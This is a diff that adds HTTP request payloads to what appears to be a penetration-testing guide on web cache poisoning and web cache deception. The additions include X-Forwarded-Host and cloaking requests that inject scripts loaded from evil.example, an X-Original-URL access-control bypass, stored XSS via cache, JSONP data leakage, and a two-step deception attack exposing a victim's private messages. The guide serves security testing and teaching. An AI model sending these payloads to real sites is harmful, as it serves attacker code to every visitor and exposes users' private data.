@@ -81,17 +81,65 @@ owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
 
 ### Cacheability Rules to Test:
 
+```http
+GET /products?utm_source=test-cache-probe-8f3a HTTP/1.1
+Host: target.com
+```
+
+Resend without the query param: if the response is a `HIT` and identical, the query string is excluded from the cache key.
+
 ## 4. Unkeyed Headers
 
 ### Commonly Unkeyed Headers:
 
 **`X-Forwarded-Host`** — Poisons cache with attacker-controlled Host header:
 
+**Payload:** poison via `X-Forwarded-Host` reflected into page resources:
+
+```http
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.example
+```
+
+If the cached HTML now references `https://evil.example/resources/js/tracking.js`, every subsequent visitor receives that reference — classic poisoning-to-XSS once `evil.example` serves attacker JS at that path.
+
+**Victim replay (verification):** send a clean request with no attack headers:
+
+```http
+GET / HTTP/1.1
+Host: target.com
+```
+
+A `200 OK` body containing `evil.example` proves the poisoned entry is served to all users.
+
 **`X-Original-URL`** / **`X-Rewrite-URL`** — Access restricted paths:
+
+**Payload:** route-level cache-key confusion:
+
+```http
+GET /home HTTP/1.1
+Host: target.com
+X-Original-URL: /admin/users
+```
+
+The cache stores `/home` keyed on `/home`, but the backend renders `/admin/users`. If access control keys on the frontend path, this both bypasses auth and caches admin content under a public URL.
 
 **`X-HTTP-Method-Override`** — Change request semantics:
 
+```http
+GET /api/users/me HTTP/1.1
+Host: target.com
+X-HTTP-Method-Override: POST
+```
+
 **`X-Forwarded-For`** — IP-based cache key bypass:
+
+```http
+GET /geo-content HTTP/1.1
+Host: target.com
+X-Forwarded-For: 1.2.3.4
+```
 
 ### Unkeyed Header Discovery Methodology:
 1. Send request, note response headers and body
@@ -105,7 +153,19 @@ owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
 ### Semicolon Cloaking Technique:
 When cache uses query string splitting on `&` but backend splits on `;`:
 
+```http
+GET /page?utm_source=cache-poison;XSS=<script src=//evil.example/x.js> HTTP/1.1
+Host: target.com
+```
+
+The cache keys on `?utm_source=cache-poison`, the backend parses the second parameter and reflects it.
+
 ### Fragment Cloaking:
+
+```http
+GET /page#<img src=x onerror=alert(1)>?clean=1 HTTP/1.1
+Host: target.com
+```
 
 ### Parameter Pollution as Cloaking:
 
@@ -177,7 +237,41 @@ Convert a POST request (with body) into a GET request that gets cached. The cach
 
 ### Path Confusion:
 
+**Payload:** web cache deception — force the victim's authenticated page into a cacheable asset path:
+
+**Step 1:** send the victim a link to the deceptive path:
+
+```http
+GET /settings/messages.css HTTP/1.1
+Host: target.com
+Cookie: session=<victim-session>
+```
+
+The backend ignores `.css` and renders the victim's `/settings/messages` page; the cache stores it under `/settings/messages.css`.
+
+**Step 2:** attacker fetches the same URL unauthenticated:
+
+```http
+GET /settings/messages.css HTTP/1.1
+Host: target.com
+```
+
+If the victim's private messages come back, deception is confirmed.
+
 ### Path Confusion Variants:
+
+**Payload:** leading-dot and extension confusion:
+
+```http
+GET /account/profile;.js HTTP/1.1
+Host: target.com
+
+GET /account/profile%2f..%2fprofile.js HTTP/1.1
+Host: target.com
+
+GET /api/orders/list.json?cachebust=1 HTTP/1.1
+Host: target.com
+```
 
 **Leading Dot Confusion:**
 
@@ -186,6 +280,11 @@ Convert a POST request (with body) into a GET request that gets cached. The cach
 **URL Parameter Confusion:**
 
 **Double Extension:**
+
+```http
+GET /settings/messages.css.html HTTP/1.1
+Host: target.com
+```
 
 ### Cache Deception Detection:
 1. Identify endpoints returning sensitive content (`/account`, `/profile`, `/dashboard`)
@@ -206,15 +305,50 @@ Convert a POST request (with body) into a GET request that gets cached. The cach
 
 **Step 1: Identify reflection point**
 
+```http
+GET /search?q=probe123 HTTP/1.1
+Host: target.com
+```
+
+Response body contains `Results for probe123` — reflected.
+
 **Step 2: Test cacheability of reflected request**
+
+```http
+GET /search?q=cache-probe-unique-77 HTTP/1.1
+Host: target.com
+
+GET /search?q=clean HTTP/1.1
+Host: target.com
+```
+
+If the second (different `q`) returns a `HIT` with identical body, `q` is not in the key.
 
 **Step 3: Identify unkeyed input for cache key manipulation**
 
 **Step 4: Verify poisoning persistence**
 
+```http
+GET /search?q=anything<script src=//evil.example/x.js> HTTP/1.1
+Host: target.com
+
+GET /search?q=normal-user-query HTTP/1.1
+Host: target.com
+```
+
+The clean follow-up returning the `<script>` payload = stored XSS via cache.
+
 ### XSS via Cache Poisoning — Advanced Vectors:
 
 **JSONP Endpoint Poisoning:**
+
+```http
+GET /api/user?callback=legit_cb HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.example
+```
+
+If the cached response becomes `evil.example_cb({"user":"victim"})` served from `evil.example`'s origin, the poisoned JSONP leaks victim data to attacker JS.
 
 **CSS-Based XSS via Cache:**
 
